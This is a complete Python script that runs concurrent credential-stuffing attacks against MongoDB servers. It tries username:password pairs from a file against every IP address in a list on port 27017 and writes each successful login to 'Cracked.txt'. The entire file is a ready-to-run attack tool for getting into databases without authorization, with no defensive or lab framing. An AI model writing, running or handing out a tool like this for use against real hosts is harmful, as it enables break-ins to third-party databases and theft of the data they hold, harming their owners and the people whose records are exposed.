import asyncio
import motor.motor_asyncio
import sys
import time
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from tqdm.asyncio import tqdm

console = Console()

async def load_file(file_name):
    with open(file_name, 'r') as file:
        return [line.strip() for line in file if line.strip()]

async def auth(ip, username, password):
    client = motor.motor_asyncio.AsyncIOMotorClient(
        f'mongodb://{username}:{password}@{ip}:27017/',
        serverSelectionTimeoutMS=5000,
        connectTimeoutMS=5000,
    )
    try:
        await client.server_info()
        return True
    except Exception:
        return False
    finally:
        client.close()

async def scan_mongo(ip, combos, pbar):
    for username, password in combos:
        try:
            if await auth(ip, username, password):
                console.print(f"[bold green][SUCCESS][/bold green] Found valid credentials for [cyan]{ip}[/cyan]: [yellow]{username}:{password}[/yellow]")
                with open("Cracked.txt", "a") as good_file:
                    good_file.write(f"{ip}:{username}:{password}\n")
                pbar.update(1)
                return True, ip, username, password
        except Exception:
            pass
        pbar.update(1)
    return False, ip, None, None

async def main(ips_file, combos_file):
    ips = await load_file(ips_file)
    combos = [combo.split(':') for combo in await load_file(combos_file)]
    total_ips = len(ips)
    total_combos = len(combos)
    total_attempts = total_ips * total_combos
    start_time = time.time()
    good_credentials = []

    console.print(Panel(Text(f"Starting scan of [bold]{total_ips}[/bold] IP addresses with [bold]{total_combos}[/bold] credential combinations...", style="cyan")))

    with tqdm(total=total_attempts, desc="Scanning", unit="attempt") as pbar:
        tasks = [scan_mongo(ip, combos, pbar) for ip in ips]
        results = await asyncio.gather(*tasks)

        good_credentials = [result for result in results if result[0]]

    elapsed_time = time.time() - start_time
    attempts_per_second = total_attempts / elapsed_time if elapsed_time > 0 else 0

    console.print(Panel(Text.assemble(
        ("Scan complete!\n", "bold magenta"),
        (f"{len(good_credentials)} Valid credentials found! Saved to Cracked.txt.\n", "green"),
        (f"Total attempts: {total_attempts}\n", "cyan"),
        (f"Average attempts per second: {attempts_per_second:.2f}", "cyan")
    )))

if __name__ == "__main__":
    if len(sys.argv) != 3:
        console.print("[bold red]Usage: python script.py <ips_file.txt> <combos_file.txt>[/bold red]")
    else:
        asyncio.run(main(sys.argv[1], sys.argv[2]))
